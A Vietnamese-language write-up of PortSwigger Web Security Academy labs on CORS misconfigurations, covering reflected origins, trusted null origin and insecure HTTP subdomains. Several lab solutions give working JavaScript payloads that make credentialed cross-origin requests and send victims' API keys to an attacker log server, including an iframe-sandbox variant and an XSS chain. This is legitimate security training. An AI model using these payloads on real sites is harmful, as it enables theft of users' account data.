# Vulnerabilities arising from CORS configuration issues

Nhiều trang web hiện đại sử dụng CORS để cho phép truy cập từ các tên miền phụ và các bên thứ ba đáng tin cậy. Tuy nhiên, việc triển khai CORS có thể mắc lỗi hoặc được cấu hình quá lỏng lẻo nhằm đảm bảo mọi thứ hoạt động trơn tru, và điều này có thể dẫn đến các lỗ hổng có thể bị khai thác.

# Lab: CORS vulnerability with basic origin reflection

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image.png?raw=true)

Truy cập lab: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image1.png?raw=true)

Đăng nhập vào tài khoản wiener: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image2.png?raw=true)

Kiểm tra trong Burp HTTP history, tìm request AJAX gửi đến /accountDetails để lấy API key.

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image3.png?raw=true)

Response của request này: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image4.png?raw=true)

=> Response từ server chứa tiêu đề **Access-Control-Allow-Credentials: true**, nghĩa là nó hỗ trợ CORS với thông tin xác thực.

CORS thường cho phép các trang web chia sẻ tài nguyên giữa các miền khác nhau.

Khi Access-Control-Allow-Credentials: true xuất hiện, trình duyệt sẽ gửi cookie của người dùng khi thực hiện request chéo miền.

Nếu Access-Control-Allow-Origin có thể phản hồi lại với giá trị do attacker kiểm soát, thì hệ thống có thể bị khai thác.

Gửi request /accountDetails đến Burp Repeater và sửa tiêu đề để thêm: 

    Origin: https://example.com

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image5.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image6.png?raw=true)

=>  server phản hồi với header: 

    Access-Control-Allow-Origin: https://example.com

=>  server không kiểm soát chặt chẽ nguồn gốc (Origin) mà nó cho phép truy cập. Có nghĩa là server chấp nhận bất kỳ trang web nào làm nguồn hợp lệ.

Payload để nhập vào Exploit server:

    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://0ab200e5042e09988298dded00ff0044.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location = '/log?key=' + this.responseText;
        };
    </script>

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image7.png?raw=true)


- **withCredentials = true** đảm bảo rằng trình duyệt gửi cookie xác thực của nạn nhân.

- Nếu server có cấu hình CORS không an toàn, nó sẽ trả về API key cho trang web độc hại.

- **location='/log?key='+this.responseText;** tự động chuyển hướng trình duyệt đến trang log của attacker với API key bị đánh cắp.

Deliver attack to victim và quan sát Access log: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image8.png?raw=true)

=> Tìm ra API key của nạn nhân là y4HpPTYTr5eYNK0mwl1sJfEFnbIahDk6. Submit API key và solved bài lab.

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image9.png?raw=true)

# Server-generated ACAO header from client-specified Origin header

Một số ứng dụng web cần cung cấp quyền truy cập cho nhiều miền khác nhau. Việc duy trì danh sách các miền được phép đòi hỏi nỗ lực liên tục, và bất kỳ sai sót nào cũng có thể làm gián đoạn chức năng. Do đó, một số ứng dụng chọn cách dễ dàng hơn là cho phép truy cập từ bất kỳ miền nào. 

Một cách để làm điều này là đọc giá trị của header **Origin** từ yêu cầu và đưa vào header phản hồi một giá trị cho biết rằng miền gửi yêu cầu được phép. Ví dụ, giả sử ứng dụng web nhận được yêu cầu sau: 

    GET /sensitive-victim-data HTTP/1.1
    Host: vulnerable-website.com
    Origin: https://malicious-website.com
    Cookie: sessionid=...

Sau đó, ứng dụng web phản hồi như sau:

    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://malicious-website.com
    Access-Control-Allow-Credentials: true
    ...

Các header này cho biết rằng **yêu cầu từ miền gửi (malicious-website.com) được chấp nhận** và các yêu cầu cross-origin có thể bao gồm cookie (Access-Control-Allow-Credentials: true), do đó, chúng sẽ được xử lý trong phiên đăng nhập của người dùng. 

Vì ứng dụng web phản hồi lại bất kỳ giá trị **Origin** nào trong header **Access-Control-Allow-Origin**, điều này có nghĩa là **bất kỳ miền nào cũng có thể truy cập tài nguyên từ miền dễ bị tấn công**. Nếu phản hồi chứa thông tin nhạy cảm như API key hoặc CSRF token, kẻ tấn công có thể khai thác lỗ hổng này bằng cách chèn đoạn mã sau vào trang web của mình: 

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='//malicious-website.com/log?key='+this.responseText;
    };

Giải thích: 

1. Kẻ tấn công chèn mã JS trên trang web độc hại của chúng.

2. Khi người dùng (đã login vào **vulnerable-website.com**) truy cập trang của kẻ tấn công, mã JS sẽ gửi yêu cầu đến **/sensitive-victim-data**.

3. Vì trang web dễ bị tấn công cho phép bất kỳ miền nào truy cập, nó phản hồi lại dữ liệu nhạy cảm.

4. Mã JS thu thập phản hồi và gửi nó đến máy chủ của kẻ tấn công (**malicious-website.com/log**).

5. Kẻ tấn công có thể thu thập dữ liệu nhạy cảm như API key hoặc token đăng nhập của nạn nhân.

# Errors parsing Origin headers

Một số ứng dụng web hỗ trợ truy cập từ nhiều nguồn (origin) bằng cách sử dụng **danh sách trắng (whitelist)** gồm các miền được phép. Khi nhận được một yêu cầu CORS, ứng dụng web sẽ **so sánh giá trị Origin được cung cấp với danh sách trắng**. Nếu **Origin** có trong danh sách, ứng dụng sẽ phản hồi lại trong header **Access-Control-Allow-Origin** để cho phép truy cập. 

Ví dụ, ứng dụng web nhận được yêu cầu hợp lệ như sau: 

    GET /data HTTP/1.1
    Host: normal-website.com
    ...
    Origin: https://innocent-website.com

Ứng dụng kiểm tra giá trị **Origin** trong danh sách các miền được phép. Nếu miền đó có trong danh sách, ứng dụng sẽ phản hồi như sau: 

    HTTP/1.1 200 OK
    ...
    Access-Control-Allow-Origin: https://innocent-website.com

**Lỗi có thể xảy ra**: Nếu ứng dụng **xử lý sai** hoặc **kiểm tra không đúng** danh sách trắng, kẻ tấn công có thể lợi dụng lỗ hổng này để vượt qua cơ chế bảo mật CORS và truy cập dữ liệu nhạy cảm. 

# Errors parsing Origin headers - Continued

Các lỗi thường xảy ra khi triển khai danh sách trắng (whitelist) Origin trong CORS. Một số tổ chức quyết định cho phép truy cập từ tất cả các tên miền phụ của họ (bao gồm cả các tên miền phụ chưa tồn tại). Một số ứng dụng web còn cho phép truy cập từ các tên miền của tổ chức khác, bao gồm cả các tên miền phụ. Những quy tắc này thường được triển khai bằng cách so khớp tiền tố hoặc hậu tố URL, hoặc sử dụng biểu thức chính quy. Bất kỳ sai sót nào trong việc triển khai có thể dẫn đến việc cấp quyền truy cập cho các tên miền bên ngoài không mong muốn. 

Ví dụ, giả sử một ứng dụng web cho phép truy cập từ tất cả các tên miền kết thúc bằng: 

    normal-website.com

Kẻ tấn công có thể lợi dụng điều này bằng cách đăng ký tên miền: 

    hackersnormal-website.com

Kẻ tấn công có thể lợi dụng bằng cách sử dụng tên miền: 

    normal-website.com.evil-user.net

# Whitelisted null origin value

Theo đặc tả của **Origin header**, giá trị **null** được hỗ trợ. Trình duyệt có thể gửi giá trị **null** trong **Origin header** trong một số tình huống đặc biệt, bao gồm: 

- Chuyển hướng giữa các nguồn gốc khác nhau (cross-origin redirects).
- Yêu cầu từ dữ liệu đã được tuần tự hóa (serialized data).
- Yêu cầu sử dụng giao thức file.
- Yêu cầu giữa các nguồn gốc trong môi trường sandbox. 

# Lab: CORS vulnerability with trusted null origin

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image10.png?raw=true)

Truy cập lab: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image11.png?raw=true)

Đăng nhập vào tài khoản wiener: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image12.png?raw=true)

Tìm kiếm yêu cầu đến /accountDetails trong Burp Proxy history: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image13.png?raw=true)

Response của request này: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image14.png?raw=true)

Response có **Access-Control-Allow-Credentials header**, gợi ý rằng website có hỗ trợ CORS. 

Thêm **Origin header** với giá trị null: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image15.png?raw=true)

Send request, quan sát response: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image16.png?raw=true)

=> **Access-Control-Allow-Origin header** có giá trị null. 

Payload thêm vào exploit server: 

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0af700940407afa780aa031000ec0037.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location='https://exploit-0a0b00500404af0980ca028b01700068.exploit-server.net//log?key='+encodeURIComponent(this.responseText);
        };
    </script>"></iframe>

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image17.png?raw=true)

Giải thích: 

Trình duyệt có thể gửi **Origin: null** trong một số trường hợp đặc biệt, bao gồm:

- sandbox trong < iframe >: Khi một iframe có thuộc tính sandbox nhưng không có allow-same-origin, trình duyệt sẽ chặn quyền truy cập thông tin từ tên miền gốc và thay thế giá trị Origin bằng null.

- Sử dụng srcdoc: Khi srcdoc được dùng làm nguồn cho iframe, trang được tải bên trong iframe không có một nguồn gốc thực sự, dẫn đến Origin: null.

Một số máy chủ có chính sách CORS kém bảo mật và cho phép null trong danh sách trắng (whitelist). Như phân tích ở trên, ứng dụng mục tiêu có cấu hình sai: 

    Access-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true

Thì request sẽ được trình duyệt cho phép ngay cả khi nó đến từ một nguồn không xác định (null origin). Do đó, request từ iframe này vẫn có thể lấy dữ liệu từ https://0af700940407afa780aa031000ec0037.web-security-academy.net/accountDetails nếu máy chủ mục tiêu cho phép null như một nguồn hợp lệ.

Quy trình: 

- Kẻ tấn công tạo một trang HTML chứa iframe này.
- Khi nạn nhân mở trang, iframe thực hiện request XMLHttpRequest (XHR) đến trang mục tiêu với withCredentials = true (cho phép gửi cookie phiên).
- Nếu máy chủ mục tiêu chấp nhận **Origin: null**, phản hồi sẽ được gửi lại cho script trong iframe.
- Script này sau đó gửi dữ liệu đánh cắp đến máy chủ của kẻ tấn công (exploit-server.net).

=> Deliver exploit to victim và xem Access log: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image18.png?raw=true)

=> Tìm ra API key của administrator: a7emNqBMuJQzlV3feCvVhV2A7sTj7XrK

Submit api key và solved bài lab!

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image19.png?raw=true)

# Exploiting XSS via CORS trust relationships

Ngay cả khi CORS được cấu hình "đúng cách", nó vẫn thiết lập một mối quan hệ tin cậy giữa hai nguồn gốc (origins).Nếu một trang web tin tưởng một nguồn gốc dễ bị tấn công Cross-Site Scripting (XSS), kẻ tấn công có thể lợi dụng lỗ hổng XSS để chèn một đoạn JavaScript.

Đoạn mã độc này có thể sử dụng CORS để gửi yêu cầu và lấy thông tin nhạy cảm từ trang web đã tin tưởng ứng dụng có lỗ hổng XSS.

# Exploiting XSS via CORS trust relationships - Continued

Giả sử có yêu cầu sau::

    GET /api/requestApiKey HTTP/1.1  
    Host: vulnerable-website.com  
    Origin: https://subdomain.vulnerable-website.com  
    Cookie: sessionid=...  

Nếu máy chủ phản hồi như sau:

    HTTP/1.1 200 OK  
    Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com  
    Access-Control-Allow-Credentials: true  

Điều này có nghĩa là máy chủ tin tưởng **subdomain.vulnerable-website.com** và cho phép các yêu cầu CORS từ đây, đồng thời hỗ trợ gửi cookie xác thực (**Access-Control-Allow-Credentials: true**).

Kẻ tấn công có thể lợi dụng lỗ hổng XSS trên **subdomain.vulnerable-website.com** để chèn một đoạn mã JavaScript thực hiện yêu cầu CORS và đánh cắp API key. Ví dụ:

    https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>

Khi nạn nhân truy cập liên kết trên, mã JavaScript độc hại sẽ chạy trên trình duyệt của họ và thực hiện request CORS đến **vulnerable-website.com** để lấy API key. Vì máy chủ tin tưởng **subdomain.vulnerable-website.com**, nên yêu cầu này sẽ được thực thi và dữ liệu nhạy cảm sẽ bị rò rỉ.

# Breaking TLS with poorly configured CORS

Giả sử một ứng dụng áp dụng nghiêm ngặt giao thức **HTTPS**, nhưng lại **danh sách trắng** (whitelist) một subdomain đáng tin cậy chỉ sử dụng **HTTP**. Điều này tạo ra một lỗ hổng bảo mật nghiêm trọng.

Ví dụ, khi ứng dụng nhận được yêu cầu sau:

    GET /api/requestApiKey HTTP/1.1  
    Host: vulnerable-website.com  
    Origin: http://trusted-subdomain.vulnerable-website.com  
    Cookie: sessionid=...  

Ứng dụng phản hồi:

    HTTP/1.1 200 OK  
    Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com  
    Access-Control-Allow-Credentials: true  

Điều này có nghĩa là ứng dụng cho phép truy cập từ một subdomain **không sử dụng HTTPS**.

Kẻ tấn công có thể **chặn lưu lượng HTTP** từ subdomain đó bằng các kỹ thuật như **Man-in-the-Middle (MITM)** hoặc **DNS spoofing**, rồi chèn JavaScript độc hại để gửi yêu cầu CORS đến **vulnerable-website.com**.

Vì **Access-Control-Allow-Credentials: true**, nên trình duyệt sẽ gửi cookie phiên của nạn nhân theo yêu cầu. Kẻ tấn công có thể đánh cắp dữ liệu nhạy cảm từ ứng dụng chính ngay cả khi ứng dụng đó đang sử dụng **HTTPS**.

# Lab: CORS vulnerability with trusted insecure protocols

![img](20)

Truy cập lab: 

![img](21)

Login tài khoản wiener: 

![img](22)

Mở Burp history, tìm kiếm request tới /accountDetails:

![img](23)

=> Response của request: 

![img](24)

=> Có **Access-Control-Allow-Credentials header**, như vậy server có thể hỗ trợ CORS. 

Chỉnh sửa request, thêm header Origin: http://subdomain.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net

![img](25)

Send request, quan sát response:

![img](26)

=> Máy chủ phản hồi **Access-Control-Allow-Origin header**, xác nhận cấu hình CORS cho phép truy cập từ các subdomains khác tùy ý, cả HTTPs và HTTP.

Chọn 1 sản phẩm và check stock: 

![img](27)

=> Trang này sử dụng HTTP. Đồng thời, nhận thấy tham số productID dễ bị tấn công XSS: 

![img](28)

Payload chèn vào exploit server:

    <script>
        document.location="http://stock.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a0c007c04d3d989808abbe601a8007f.exploit-server.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>

Phân tích: 

**Điều hướng nạn nhân đến trang có mã độc**

        <script>
            document.location="http://stock.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/?productId=4<script>...</script>&storeId=1"
        </script>

**document.location=...** sẽ tự động điều hướng trình duyệt của nạn nhân đến một trang web có chứa mã độc: 
        
        http://stock.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/?productId=4<script>...</script>&storeId=1

Do trang web có lỗ hổng **Reflected XSS**, mã JavaScript độc hại sẽ được thực thi ngay khi URL này được tải.

**Gửi yêu cầu CORS để đánh cắp dữ liệu**

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

Tạo một **XMLHttpRequest** để gửi yêu cầu GET đến /accountDetails, nơi chứa thông tin tài khoản của nạn nhân.

**req.withCredentials = true;**:

- Buộc trình duyệt gửi cookie đăng nhập của nạn nhân theo yêu cầu.
- Nếu trang 0ade004e0488d95280a1bc83008f00d2.web-security-academy.net có cấu hình CORS không đúng (Access-Control-Allow-Credentials: true và Access-Control-Allow-Origin không đúng cách), phản hồi sẽ được trình duyệt chấp nhận và xử lý.

**Gửi dữ liệu đánh cắp đến máy chủ của kẻ tấn công**

    function reqListener() {
        location='https://exploit-0a0c007c04d3d989808abbe601a8007f.exploit-server.net/exploit/log?key='+this.responseText;
    };

- Khi yêu cầu CORS hoàn thành, reqListener sẽ chạy, lấy nội dung phản hồi từ /accountDetails.

- Sau đó, trình duyệt sẽ điều hướng đến máy chủ của kẻ tấn công, kèm theo dữ liệu đánh cắp (this.responseText), chẳng hạn như thông tin cá nhân hoặc API key.

Deliver attack to victim và xem Access log: 

![img](29)

=> Tìm ra api key của nạn nhân: mS3S2vBwnqpgsmvrdxI8TLnZXm0iqeej

Submit api key và solved bài lab!

![img](30)



